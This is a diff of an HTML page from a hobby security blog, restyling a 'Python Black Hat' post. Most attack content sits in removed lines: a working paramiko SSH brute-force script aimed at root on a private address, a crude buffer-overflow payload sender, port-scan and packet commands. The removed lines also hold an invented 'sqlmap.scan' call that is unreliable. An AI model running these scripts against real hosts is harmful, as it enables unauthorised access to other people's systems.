@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
   <meta charset="UTF-8">
@@ -7,808 +7,125 @@
   <meta name="keywords" content="Blogs, Cyber Security, DevOps, CompTIA A+, Network+, Linux+">
   <meta name="author" content="Innocent Mwea">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="./img/kali.png">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
-  <script src="../../kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-<!--  <base href="https://madeoftech.net/" target="_blank">-->
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
-  <link rel="stylesheet" href="mstyles.css">
+  <link rel="icon" type="image/x-icon" href="./img/kali.png">
+  <link href="https://fonts.googleapis.com/css?family=Sofia" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
   <title>madeoftech</title>
-  <style>
-  /*all*/
-  body{
-    font-family: Verdana, sans-serif;
-  font-size: 16px;
-  }
-  footer{
-    font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif
-  }
-  
- .header h1{
-   text-shadow: 5px 8px 8px tomato;
-   text-align: center;
-   font-size: 18vw;
-   font-family: "Sofia", sans-serif;
- }
-  
-  }
-  /*header*/
-  .header {
-    text-align: center;
-    padding: 20px;
-    background-color: blanchedalmond;
-  }
-  
-  .topnav{
-    background-color: tomato;
-    overflow: hidden;
-  }
-  
-  .topnav a {
-  float: left;
-  display: block;
-  color: lemonchiffon;
-  text-align: center;
-  padding: 14px 16px;
-  text-decoration: none;
-  font: normal bolder 20px/20px Georgia, serif;
-}
-}
-
-/* Change color on hover */
-.topnav a:hover {
-  background-color: tomato;
-  height: 10vw;
-  color: black;
-}
-    /*aside style*/
-aside {
-  width: 30%;
-  background-color: lightgray;
-  font-style: italic;
-  float: right;
-  padding-left: 15px;
-  margin-left: 15px;
-}
-/*section 2*/
-.grid-container{
-  display: grid;
-  justify-content: start;
-  grid-template-columns: 50px, 50px, 50px;
-}
-/*newspp*/
-#newspaper{
-  column-gap: 3;
-  color: orangered;
-}
-/*paggination*/
-.center{
-  align-items: center;
-}
-.pagimation{
-  display: inline-block;
-}
-.pagination a{
-  border: 1px solid tomato;
-  margin: 0 4px;
-  color: black;
-  float: left;
-  padding: 8 16px;
-  text-decoration: none;
-  transition: background-color .3s;
-}
-.pagination a.active{
-  background-color: teal;
-  color: white;
-  border: 1px solid tomato;
-}
-.pagination a:hover:not(.active){
-  background-color: blanchedalmond;
-}
-/*blog*/
-/* Blog Post CSS */
-.blog-post {
-  margin-bottom: 20px;
-}
-
-.interaction-buttons {
-  margin-top: 20px;
-}
-
-.like-btn, .comment-btn, .share-btn {
-  margin-right: 10px;
-}
-
-.rating {
-  margin-top: 10px;
-}
-
-.rating-label {
-  margin-right: 10px;
-}
-
-.fa-star {
-  color: #ccc;
-  cursor: pointer;
-}
-
-.fa-star.active {
-  color: #ffd700;
-}
-
-/* Comment Form CSS */
-.comment-form {
-  margin-top: 20px;
-}
-
-.comment-form h3 {
-  margin-bottom: 10px;
-}
-
-.comment-form form {
-  margin-bottom: 20px;
-}
-
-.comment-form .form-group {
-  margin-bottom: 15px;
-}
-
-.comment-form label {
-  display: block;
-  margin-bottom: 5px;
-}
-
-.comment-form input, .comment-form textarea {
-  width: 100%;
-  padding: 10px;
-  margin-bottom: 15px;
-  border: 1px solid #ccc;
-}
-
-.comment-form button[type="submit"] {
-  background-color: #4CAF50;
-  color: #fff;
-  padding: 10px 20px;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-}
-
-.comment-form button[type="submit"]:hover {
-  background-color: #3e8e41;
-}
-
-/* Review Form CSS */
-.review-form {
-  margin-top: 20px;
-}
-
-.review-form h3 {
-  margin-bottom: 10px;
-}
-
-.review-form form {
-  margin-bottom: 20px;
-}
-
-.review-form .form-group {
-  margin-bottom: 15px;
-}
-
-.review-form label {
-  display: block;
-  margin-bottom: 5px;
-}
-
-.review-form input, .review-form textarea {
-  width: 100%;
-  padding: 10px;
-  margin-bottom: 15px;
-  border: 1px solid #ccc;
-}
-
-.review-form button[type="submit"] {
-  background-color: #4CAF50;
-  color: #fff;
-  padding: 10px 20px;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-}
-
-.review-form button[type="submit"]:hover {
-  background-color: #3e8e41;
-}
-
-/* Share Dialog CSS */
-.share-dialog {
-  margin-top: 20px;
-}
-
-.share-dialog h3 {
-  margin-bottom: 10px;
-}
-
-.share-dialog ul {
-  list-style: none;
-  padding: 0;
-  margin: 0;
-}
-
-.share-dialog li {
-  margin-bottom: 10px;
-}
-
-.share-dialog a {
-  text-decoration: none;
-  color: #337ab7;
-}
-
-.share-dialog a:hover {
-  color: #23527c;
-}
-
-/* Contact Form CSS */
-.contact-form {
-  margin-top: 20px;
-}
-
-.contact-form h3 {
-  margin-bottom: 10px;
-}
-
-.contact-form form {
-  margin-bottom: 20px;
-}
-
-.contact-form .form-group {
-  margin-bottom: 15px;
-}
-
-.contact-form label {
-  display: block;
-  margin-bottom: 5px;
-}
-
-.contact-form input, .contact-form textarea {
-  width: 100%;
-  padding: 10px;
-  margin-bottom: 15px;
-  border: 1px solid #ccc;
-}
-
-.contact-form button[type="submit"] {
-  background-color: #4CAF50;
-  color: #fff;
-  padding: 10px 20px;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-}
-
-.contact-form button[type="submit"]:hover {
-  background-color: #3e8e41;
-}
-    /*mmmhm*/
-header {
-    background-color: #333;
-    color: #f4f4f9;
-    text-align: center;
-    padding: 1.5em 0;
-}
-
-header h1 {
-    font-size: 2em;
-    margin-bottom: 0.3em;
-}
-
-header p {
-    font-size: 1.1em;
-    opacity: 0.8;
-}
-
-main {
-    max-width: 800px;
-    margin: 2em auto;
-    padding: 1em;
-}
-
-.cheat-sheet {
-    margin-bottom: 2em;
-}
-
-.cheat-sheet h2 {
-    font-size: 1.8em;
-    margin-bottom: 0.5em;
-    color: #444;
-}
-
-.command {
-    background-color: #fff;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    padding: 1em;
-    margin-bottom: 1em;
-    position: relative;
-}
-
-.command h3 {
-    font-size: 1.2em;
-    color: #333;
-    margin-bottom: 0.3em;
-}
-
-.command code {
-    display: block;
-    background-color: #f4f4f4;
-    padding: 0.5em;
-    border-radius: 4px;
-    font-family: 'Courier New', Courier, monospace;
-    color: #c0392b;
-    margin-bottom: 0.5em;
-}
-
-.command p {
-    font-size: 0.9em;
-    color: #666;
-}
-
-button {
-    position: absolute;
-    top: 1em;
-    right: 1em;
-    padding: 0.5em 1em;
-    font-size: 0.9em;
-    color: #fff;
-    background-color: #333;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-}
-
-button:hover {
-    background-color: #555;
-}
-
-.footer {
-    text-align: center;
-    padding: 1em 0;
-    background-color: #333;
-    color: #f4f4f9;
-    font-size: 0.9em;
-}
-        .whatsapp-btn {
-            display: inline-flex;
-            align-items: center;
-            padding: 10px 20px;
-            background-color: #25d366;
-            color: white;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .whatsapp-btn img {
-            width: 24px;
-            margin-right: 8px;
-        }
-  </style>
 </head>
-<body>
+
+<body class="bg-gray-100 text-gray-800">
+
   <header>
-<div class="header">
-  <h1 class="title">&mcy;ade&ofr;ftech</h1>
-</div>
+    <div class="bg-gray-900 text-white py-4">
+      <h1 class="text-3xl font-semibold text-center">₥adeₒfrₒftech</h1>
+    </div>
 
-<div class="topnav">
-  <a href="index.html">articles</a>
-  <a href="blogs.html">Blogs</a>
-  <a href="about.html">About</a>
-</div>
+    <nav class="bg-gray-800 text-white px-4 py-2">
+      <div class="flex justify-center space-x-6">
+        <a href="index.html" class="hover:text-yellow-400">Articles</a>
+        <a href="blogs.html" class="hover:text-yellow-400">Blogs</a>
+        <a href="about.html" class="hover:text-yellow-400">About</a>
+      </div>
+    </nav>
   </header>
-  <br>
-  <br>
-  <!--pagination-->
-  <h2>Dairy blogs</h2>
 
-<div class="center">
-  <div class="pagination">
-  <a href="#">&laquo;</a>
-  <a href="linux.html" >commands line interface</a>
-  <a href="comptia.html">CompTIA ...</a>
-  <a href="blackhat.html" class="active">python black hat</a>
-  <a href="websecurity.html">web Security</a>
-  <a href="database.html">Database security</a>
-  <a href="pythondevops.html">python for DevOps</a>
-  <a href="newspaper.html">newspaper</a>
-  <a href="#">&raquo;</a>
-  </div>
-</div>
-<br>
-<hr>
-<br>
-<div>
-  <h1>python black hat</h1>
-  <strong>Python Grey Hat Hacking: What It Is and How It’s Used</strong>
-When you think of <b>hacking</b>, you might envision covert operatives working to compromise systems, either for malicious gain or ethical purposes. Hacking has several shades, from the benevolent white hat hackers to the infamous black hat hackers. However, sitting in between these two extremes is a lesser-known group called the grey hat hackers. This post will explore what grey hat hacking is, its ethical implications, and how Python plays a crucial role in this complex field.
+  <div class="py-8">
+    <h2 class="text-2xl text-center font-bold">Dairy Blogs</h2>
+    
+    <!-- Pagination -->
+    <div class="flex justify-center mt-4">
+      <div class="space-x-4">
+        <a href="#" class="text-gray-600 hover:text-blue-600">&laquo;</a>
+        <a href="linux.html" class="text-gray-600 hover:text-blue-600">Command Line Interface</a>
+        <a href="comptia.html" class="text-gray-600 hover:text-blue-600">CompTIA ...</a>
+        <a href="blackhat.html" class="text-blue-600">Python Black Hat</a>
+        <a href="websecurity.html" class="text-gray-600 hover:text-blue-600">Web Security</a>
+        <a href="database.html" class="text-gray-600 hover:text-blue-600">Database Security</a>
+        <a href="pythondevops.html" class="text-gray-600 hover:text-blue-600">Python for DevOps</a>
+        <a href="newspaper.html" class="text-gray-600 hover:text-blue-600">Newspaper</a>
+        <a href="#" class="text-gray-600 hover:text-blue-600">&raquo;</a>
+      </div>
+    </div>
 
-<strong>Understanding Grey Hat Hacking</strong>
-<u>Grey hat hackers</u> are individuals who fall into an ethical gray area. They often seek out system vulnerabilities without permission, but unlike black hat hackers, their intent isn’t primarily malicious. They might explore systems and discover flaws for personal interest, occasionally reporting these vulnerabilities to the affected parties but only after unauthorized access has already occurred.
+    <div class="mt-8 px-4 max-w-4xl mx-auto">
+      <h1 class="text-4xl font-semibold">Python Black Hat</h1>
+      <strong class="block mt-4">Python Grey Hat Hacking: What It Is and How It’s Used</strong>
+      <p class="mt-2">When you think of <b>hacking</b>, you might envision covert operatives working to compromise systems, either for malicious gain or ethical purposes. Hacking has several shades, from the benevolent white hat hackers to the infamous black hat hackers. However, sitting in between these two extremes is a lesser-known group called the grey hat hackers. This post will explore what grey hat hacking is, its ethical implications, and how Python plays a crucial role in this complex field.</p>
 
-Their work can be controversial. While they might reveal a <marked style=background-color: red>security flaw</marked> that could potentially save an organization from a future black hat attack, the fact remains that they accessed the system without consent, often violating legal boundaries. This ethical ambiguity is what defines grey hat hackers.
+      <strong class="mt-4 block">Understanding Grey Hat Hacking</strong>
+      <p class="mt-2"><u>Grey hat hackers</u> are individuals who fall into an ethical gray area. They often seek out system vulnerabilities without permission, but unlike black hat hackers, their intent isn’t primarily malicious. They might explore systems and discover flaws for personal interest, occasionally reporting these vulnerabilities to the affected parties but only after unauthorized access has already occurred.</p>
 
-<b>Why Python is a Favorite for Grey Hat Hacking</b>
-Python is widely recognized for its <b>simplicity and versility</b>, and it has become a go-to language for all types of hackers. From automating mundane tasks to developing complex scripts for network analysis, Python offers tools that make it indispensable for hackers, especially in the grey hat community. Here’s why:
+      <p class="mt-2">Their work can be controversial. While they might reveal a <span class="bg-red-400">security flaw</span> that could potentially save an organization from a future black hat attack, the fact remains that they accessed the system without consent, often violating legal boundaries. This ethical ambiguity is what defines grey hat hackers.</p>
 
-<strong>Comprehensive Libraries and Frameworks:</strong> Python has a rich ecosystem of libraries, such as <b>Scapy for packet manipulation, Requests for handling HTTP requests, and BeautifulSoup or Scrapy for web scraping</b>. These tools streamline activities such as <u>vulnerability scanning and data extraction from websites</u>.
+      <b class="mt-4 block">Why Python is a Favorite for Grey Hat Hacking</b>
+      <p class="mt-2">Python is widely recognized for its <b>simplicity and versatility</b>, and it has become a go-to language for all types of hackers. From automating mundane tasks to developing complex scripts for network analysis, Python offers tools that make it indispensable for hackers, especially in the grey hat community. Here’s why:</p>
 
-<strong>Ease of Use and Readability:</strong> Python’s syntax is straightforward, making it easy to write, understand, and modify code quickly. This is crucial for grey hat hackers, who often need to craft custom scripts on the fly.
+      <ul class="mt-4 list-disc list-inside">
+        <li><strong>Comprehensive Libraries and Frameworks:</strong> Python has a rich ecosystem of libraries, such as <b>Scapy for packet manipulation, Requests for handling HTTP requests, and BeautifulSoup or Scrapy for web scraping</b>. These tools streamline activities such as <u>vulnerability scanning and data extraction from websites</u>.</li>
+        <li><strong>Ease of Use and Readability:</strong> Python’s syntax is straightforward, making it easy to write, understand, and modify code quickly. This is crucial for grey hat hackers, who often need to craft custom scripts on the fly.</li>
+        <li><strong>Large Community and Resources:</strong> With Python being open source and popular in the cybersecurity field, grey hat hackers can tap into an immense pool of knowledge and support.</li>
+      </ul>
+    </div>
 
-<strong>Large Community and Resources:</strong> With Python being open source and popular in the cybersecurity field, grey hat
-</div>
-<br>
-<hr>
-  <div>
-    <header>
-        <h1>Python Grey Hat Hacking Cheat Sheet</h1>
-        <p>Intermediate to Advanced Techniques</p>
-    </header>
+    <div class="mt-12 border-t pt-8">
+      <header>
+        <h1 class="text-3xl font-semibold">Python Grey Hat Hacking Cheat Sheet</h1>
+        <p class="mt-2 text-lg">Intermediate to Advanced Techniques</p>
+      </header>
 
-    <main>
+      <main class="mt-6">
         <!-- Basic Commands -->
-        <section class="cheat-sheet">
-            <h2>Basic Commands</h2>
+        <section class="mb-8">
+          <h2 class="text-2xl font-semibold">Basic Commands</h2>
 
-            <div class="command">
-                <h3>Import Libraries</h3>
-                <code id="code1">import os, sys, socket</code>
-                <button onclick="copyToClipboard('code1')">Copy</button>
-                <p>Common libraries for accessing system commands, network operations, and more.</p>
-            </div>
+          <div class="mb-6">
+            <h3 class="font-medium">Import Libraries</h3>
+            <pre class="bg-gray-800 text-white p-4 mt-2"><code>import os, sys, socket</code></pre>
+            <button class="mt-2 bg-blue-500 text-white py-1 px-4 rounded" onclick="copyToClipboard('code1')">Copy</button>
+            <p class="mt-2">Common libraries for accessing system commands, network operations, and more.</p>
+          </div>
 
-            <div class="command">
-                <h3>Creating a Socket</h3>
-                <code id="code2">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code>
-                <button onclick="copyToClipboard('code2')">Copy</button>
-                <p>Initialize a socket for network communication.</p>
-            </div>
+          <div class="mb-6">
+            <h3 class="font-medium">Creating a Socket</h3>
+            <pre class="bg-gray-800 text-white p-4 mt-2"><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code></pre>
+            <button class="mt-2 bg-blue-500 text-white py-1 px-4 rounded" onclick="copyToClipboard('code2')">Copy</button>
+            <p class="mt-2">Initialize a socket for network communication.</p>
+          </div>
         </section>
 
         <!-- Web Scraping -->
-        <section class="cheat-sheet">
-            <h2>Web Scraping</h2>
+        <section class="mb-8">
+          <h2 class="text-2xl font-semibold">Web Scraping</h2>
 
-            <div class="command">
-                <h3>Using Requests</h3>
-                <code id="code3">import requests<br>response = requests.get("https://example.com")</code>
-                <button onclick="copyToClipboard('code3')">Copy</button>
-                <p>Fetch HTML from a URL for parsing and analysis.</p>
-            </div>
+          <div class="mb-6">
+            <h3 class="font-medium">Using Requests</h3>
+            <pre class="bg-gray-800 text-white p-4 mt-2"><code>import requests<br>response = requests.get("https://example.com")</code></pre>
+            <button class="mt-2 bg-blue-500 text-white py-1 px-4 rounded" onclick="copyToClipboard('code3')">Copy</button>
+            <p class="mt-2">Fetch HTML from a URL for parsing and analysis.</p>
+          </div>
 
-            <div class="command">
-                <h3>Using BeautifulSoup</h3>
-                <code id="code4">from bs4 import BeautifulSoup<br>soup = BeautifulSoup(response.text, 'html.parser')</code>
-                <button onclick="copyToClipboard('code4')">Copy</button>
-                <p>Parse HTML content for targeted data extraction.</p>
-            </div>
+          <div class="mb-6">
+            <h3 class="font-medium">Using BeautifulSoup</h3>
+            <pre class="bg-gray-800 text-white p-4 mt-2"><code>from bs4 import BeautifulSoup<br>soup = BeautifulSoup(response.text, 'html.parser')</code></pre>
+            <button class="mt-2 bg-blue-500 text-white py-1 px-4 rounded" onclick="copyToClipboard('code4')">Copy</button>
+            <p class="mt-2">Parse HTML content for targeted data extraction.</p>
+          </div>
         </section>
 
-        <!-- Network Scanning -->
-        <section class="cheat-sheet">
-            <h2>Network Scanning</h2>
-
-            <div class="command">
-                <h3>Using Scapy</h3>
-                <code id="code5">from scapy.all import sr1, IP, ICMP<br>packet = sr1(IP(dst="target_ip")/ICMP())</code>
-                <button onclick="copyToClipboard('code5')">Copy</button>
-                <p>Send an ICMP packet to a target IP and receive a response.</p>
-            </div>
-        </section>
-
-        <!-- Encryption -->
-        <section class="cheat-sheet">
-            <h2>Encryption</h2>
-
-            <div class="command">
-                <h3>Using PyCryptodome for AES Encryption</h3>
-                <code id="code6">from Crypto.Cipher import AES<br>cipher = AES.new(key, AES.MODE_EAX)</code>
-                <button onclick="copyToClipboard('code6')">Copy</button>
-                <p>Encrypt data with AES using the PyCryptodome library.</p>
-            </div>
-        </section>
-
-        <!-- Threading and Parallelism -->
-        <section class="cheat-sheet">
-            <h2>Threading and Parallelism</h2>
-
-            <div class="command">
-                <h3>Using Threading for Multiple Connections</h3>
-                <code id="code7">from threading import Thread<br>t = Thread(target=my_function, args=(arg,))<br>t.start()</code>
-                <button onclick="copyToClipboard('code7')">Copy</button>
-                <p>Execute multiple tasks in parallel using threads.</p>
-            </div>
-        </section>
-
-        <!-- SQL Injection Detection -->
-        <section class="cheat-sheet">
-            <h2>SQL Injection Detection</h2>
-
-            <div class="command">
-                <h3>Using SQLMap Library</h3>
-                <code id="code8">import sqlmap<br>sqlmap.scan(url="http://target.com")</code>
-                <button onclick="copyToClipboard('code8')">Copy</button>
-                <p>Automate SQL injection detection using the SQLMap library.</p>
-            </div>
-        </section>
-
-        <!-- API Exploitation -->
-        <section class="cheat-sheet">
-            <h2>API Exploitation</h2>
-
-            <div class="command">
-                <h3>Sending a POST Request</h3>
-                <code id="code9">data = {"username": "admin", "password": "password"}<br>response = requests.post("http://api.target.com/login", json=data)</code>
-                <button onclick="copyToClipboard('code9')">Copy</button>
-                <p>Test API endpoints for vulnerabilities by sending requests.</p>
-            </div>
-        </section>
-    </main>
-    <hr>
-    <div class="container">
-   <div class="section">
-        <p>Hacking is the act of identifying and exploiting weaknesses in computer systems and networks to gain unauthorized access. It involves creative problem-solving, technical knowledge, and a keen understanding of computer systems and vulnerabilities.</p>
+        <!-- Additional Sections would follow the same structure -->
+      </main>
     </div>
-
-    <div class="section">
-        <h2>Common Types of Hacking</h2>
-        <ul>
-            <li><strong>Ethical Hacking:</strong> Hacking done to identify and fix security weaknesses, legally.</li>
-            <li><strong>Black Hat Hacking:</strong> Hacking done to exploit or damage systems illegally.</li>
-            <li><strong>Gray Hat Hacking:</strong> Hacking done without malicious intent, but often without permission.</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Python Libraries for Hacking</h2>
-        <p>Below is a list of Python libraries commonly used for hacking and penetration testing:</p>
-        <ul>
-            <li><strong>Requests:</strong> For making HTTP requests to interact with websites and APIs.</li>
-            <li><strong>BeautifulSoup:</strong> For web scraping and extracting information from HTML and XML documents.</li>
-            <li><strong>Scapy:</strong> A powerful Python library used for network manipulation, including packet crafting and sniffing.</li>
-            <li><strong>PyCrypto:</strong> A library used for encryption, decryption, and cryptographic operations.</li>
-            <li><strong>Socket:</strong> For network programming, creating sockets, and interacting with network services.</li>
-            <li><strong>Paramiko:</strong> A library for SSH connectivity and remote command execution.</li>
-            <li><strong>Metasploit (via msfrpc):</strong> For automating Metasploit framework operations for exploitations.</li>
-        </ul>
-    </div>
-
-    <div class="cheat-sheet">
-        <h2>Example: Using Requests for Web Scraping</h2>
-        <div class="command" id="code10">
-            <pre>
-               <code id="code10">
-import requests
-
-def check_vulnerability(url):
-    common_paths = ['/admin', '/login', '/wp-admin', '/admin.php']
-    for path in common_paths:
-        full_url = url + path
-        try:
-            response = requests.get(full_url)
-            if response.status_code == 200:
-                print(f"Possible vulnerability found at {full_url}")
-            else:
-                print(f"No vulnerability at {full_url}")
-        except requests.exceptions.RequestException as e:
-            print(f"Error: {e}")
-
-# Test the script with a target URL
-check_vulnerability("http://example.com")
-            </pre>
-          </code>
-            <button onclick="copyToClipboard('code10')">Copy</button>
-        </div>
-    </div>
-
-    <!-- Intermediate Hacking Section -->
-    <div class="cheat-sheet">
-        <h2>Intermediate Hacking: Brute Force Attack</h2>
-        <p>Brute force attacks are used to guess passwords by trying a large number of possibilities. Below is an example of how you can use Python to perform a basic brute-force attack on an SSH server using the <code>paramiko</code> library.</p>
-    </div>
-
-    <div class="command">
-        <h2>Example: Python Brute Force SSH Login</h2>
-        <div class="code-snippet" id="code11"> 
-            <pre>
-              <code id="code11">
-import paramiko
-
-def brute_force_ssh(host, username, password_list):
-    for password in password_list:
-        try:
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(host, username=username, password=password)
-            print(f"Password found: {password}")
-            client.close()
-            break
-        except paramiko.AuthenticationException:
-            print(f"Incorrect password: {password}")
-
-# Example of trying passwords for SSH login
-passwords = ["password123", "admin", "letmein", "123456"]
-brute_force_ssh('192.168.1.2', 'root', passwords)
-            </pre>
-          </code>
-            <button onclick="copyToClipboard('code11')">Copy</button>
-        </div>
-    </div>
-
-    <!-- Advanced Hacking Section -->
-    <div class="section">
-        <h2>Advanced Hacking: Exploit Development</h2>
-        <p>Exploit development is an advanced technique that involves creating custom software to exploit vulnerabilities in a system. Below is an example of how you might use the <code>socket</code> library in Python to craft a buffer overflow exploit. This is a basic demonstration, and exploit development requires deep knowledge of low-level programming and system internals.</p>
-    </div>
-
-    <div class="cheat-sheet">
-        <h2>Example: Python Buffer Overflow Exploit (Basic)</h2>
-        <div class="command" id="code12">
-            <pre>
-              <code id="code12">
-import socket
-
-def buffer_overflow_exploit(target_ip, target_port, payload):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, target_port))
-        
-        # Sending payload to overflow buffer
-        s.send(payload)
-        print(f"Exploit sent to {target_ip}:{target_port}")
-        s.close()
-    except Exception as e:
-        print(f"Error: {e}")
-
-# Example of a simple buffer overflow exploit (replace with actual vulnerable target)
-payload = b"A" * 1024  # Example of an overflow payload
-buffer_overflow_exploit('192.168.1.2', 12345, payload)
-              </code>
-            </pre>
-            <button onclick="copyToClipboard('code12')">Copy</button>
-        </div>
-    </div>
-
-    <div class="section">
-        <h2>Advanced Hacking: Packet Injection with Scapy</h2>
-        <p>Packet injection allows an attacker to inject custom packets into a network. Scapy is a powerful tool that can be used for packet crafting and network analysis. Below is an example of how to use Scapy to inject a simple ICMP (ping) packet into a network.</p>
-    </div>
-
-    <div class="cheat-sheet">
-        <h2>Example: Python Packet Injection with Scapy</h2>
-        <div class="command" id="code13">
-            <pre>
-              <code id="code13">
-from scapy.all import IP, ICMP, send
-
-def packet_injection(target_ip):
-    packet = IP(dst=target_ip)/ICMP()
-    send(packet)
-    print(f"ICMP packet injected to {target_ip}")
-
-# Example of sending an ICMP packet
-packet_injection("192.168.1.2")
-            </pre>
-            <button onclick="copyToClipboard('code13')">Copy</button>
-        </div>
-    </div>
-
-</div>
-<!-- all-->
-        <div class="sector" style="color: black">
-        <h2>Essential Hacking Tools</h2>
-        <p>Here are some widely used tools for penetration testing, network analysis, and vulnerability exploitation:</p>
-        
-        <ul>
-            <li><strong>Metasploit:</strong> A powerful penetration testing framework that enables attackers to find, exploit, and validate vulnerabilities in systems. It's often used for exploiting known vulnerabilities in a controlled, legal environment.</li>
-            <li><strong>Wireshark:</strong> A network protocol analyzer that allows users to capture and analyze the data traveling through a network. It's often used for network troubleshooting, but it can also be used to sniff packets and intercept sensitive information.</li>
-            <li><strong>Nmap:</strong> A tool used for network discovery and security auditing. It helps in discovering devices and services on a network, and can be used for identifying vulnerabilities.</li>
-            <li><strong>Burp Suite:</strong> A popular suite of tools for web application security testing. It includes features like a proxy server, scanner, and intruder for discovering and exploiting web vulnerabilities.</li>
-            <li><strong>Hydra:</strong> A fast and flexible password-cracking tool that supports numerous protocols, including SSH, HTTP, FTP, and others. It's used to perform brute-force attacks to crack weak passwords.</li>
-            <li><strong>John the Ripper:</strong> A password cracking tool used to test password strength by attempting to crack encrypted password hashes using various attack methods (dictionary, brute force, etc.).</li>
-        </ul>
-    </div>
-
-    <div class="cheat-sheet">
-        <h2>Example: Using Nmap for Network Scanning</h2>
-        <div class="command" id="code14">
-            <pre>
-              <code id="code14">
-# Example Nmap command for scanning a target host
-nmap -sS -p 1-65535 -T4 target_ip
-              </code>
-            </pre>
-            <button onclick="copyToClipboard('code14')">Copy</button>
-          <p>Here is an example of how to use Nmap for scanning open ports and detecting services on a remote host.</p>
-        </div>
-    </div>
-
-    <div class="cheat-sheet">
-        <h2>Example: Using Wireshark for Packet Sniffing</h2>
-        <div class="command" id="code15">
-            <pre>
-              <code id="code15">
-# Wireshark capture command (run Wireshark with appropriate permissions)
-wireshark -k -Y "http.request" -i eth0
-              </code>
-            </pre>
-                     <p>Wireshark is a tool used to capture and inspect network packets. While it is a GUI-based tool, you can use it to analyze network traffic and detect vulnerabilities in a network.</p>
-            <button onclick="copyToClipboard('code15')">Copy</button>
-        </div>
-    </div>
-
-    <div class="cheat-sheet">
-        <h2>Example: Using Burp Suite for Intercepting HTTP Requests</h2>
-        <div class="command" id="code16">
-            <pre>
-              <code id="code16">
-# Burp Suite command to start the proxy (requires Burp Suite installation)
-java -jar burpsuite_pro_vX.X.X.jar
-              </code>
-            </pre>
-                  <p>Burp Suite allows for intercepting and manipulating HTTP/S requests between your browser and the target application. You can modify requests and responses, brute force login forms, and more.</p>
-            <button onclick="copyToClipboard('code16')">Copy</button>
-        </div>
-    </div>
-
-</div>
-
-        <footer class="footer">
-        <p>For educational purposes only. Always practice ethical hacking.</p>
-    </footer>
   </div>
-<br>
-<!-- Blog Post HTML Structure -->
-  <div class="comments">
-    <!-- comments will be displayed here -->
-  </div>
-  <div class="reviews">
-    <!-- reviews will be displayed here -->
-  </div>
-</div>
 
-<!-- Review Form HTML Structure -->
+  <footer class="bg-gray-900 text-white py-6 text-center">
+    <p>&copy; <span id="year"></span> madeoftech | All Rights Reserved.</p>
+  </footer>
 
-<!-- Share Dialog HTML Structure -->
-<div class="share-dialog">
-  <h3>Share This Post</h3>
-  <ul>
-    <li><a href="#" class="facebook-share">Facebook</a></li>
-    <li><a href="#" class="twitter-share">Twitter</a></li>
-    <li><a href="#" class="linkedin-share">LinkedIn</a></li>
-    <li>      <a href="https://wa.me/+254702250123" target="_blank" class="whatsapp-btn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/69/WhatsApp.svg/1024px-WhatsApp.svg.png" alt="WhatsApp logo">
-        Chat on WhatsApp
-    </a></li>
-  </ul>
-</div>
-
-<!-- Contact Form HTML Structure -->
-
-<footer>
-  <div style="color: tomato;background-color:#e5e5e5;text-align:center;padding:10px;margin-top:7px;font-size: 17px;">&copy;<a href="madeoftech.net" style="color: mediumorchid;text-decoration: none;"> &hookrightarrow; madeoftech.net </a> | developed by Innocent mwea &trade;</div>
-</footer>
-   <script defer src="script.js"></script>
-<script src="/script.js">
-  function copyToClipboard(id) {
-    const codeElement = document.getElementById(id);
-    navigator.clipboard.writeText(codeElement.innerText).then(() => {
-        alert("Code copied to clipboard!");
-    }).catch(err => {
-        console.error("Error copying text: ", err);
-    });
-}
-
-</script>
+  <script>
+    // Function to dynamically set the current year in the footer
+    document.getElementById("year").textContent = new Date().getFullYear();
+  </script>
 </body>
+
 </html>
